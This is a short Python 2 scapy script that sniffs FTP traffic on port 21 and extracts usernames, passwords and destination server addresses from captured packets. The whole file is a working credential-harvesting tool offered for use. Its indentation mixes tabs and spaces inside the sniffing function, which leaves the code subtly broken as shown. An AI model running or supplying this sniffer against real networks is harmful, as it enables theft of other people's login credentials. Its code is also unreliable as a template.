#!/usr/bin/python
# -*- coding: utf-8 -*-

import optparse
from scapy.all import *


def ftpSniff(pkt):
    
	# Extract the dst field from the IP layer and store a variable 
	# dest.  This allows us to correlate the user, pswd to address of
	# FTP server
	dest = pkt.getlayer(IP).dst
    # Extract the raw load from the packet and store as variable raw
	raw = pkt.sprintf('%Raw.load%')
    # Use reg-ex to extract the username and store as variable user
	user = re.findall('(?i)USER (.*)', raw)
    # Extract the FTP password and store as variable pswd
	pswd = re.findall('(?i)PASS (.*)', raw)
    
    if user:
        print '[*] Detected FTP Login to ' + str(dest)
        print '[+] User account: ' + str(user[0])
    elif pswd:
        print '[+] Password: ' + str(pswd[0])


def main():
    parser = optparse.OptionParser('usage %prog '+\
                                   '-i <interface>')
    parser.add_option('-i', dest='interface', \
                      type='string', help='specify interface to listen on')
    (options, args) = parser.parse_args()
    
    if options.interface == None:
        print parser.usage
        exit(0)
    else:
        conf.iface = options.interface
    
    try:
        sniff(filter='tcp port 21', prn=ftpSniff)
    except KeyboardInterrupt:
        exit(0)


if __name__ == '__main__':
    main()


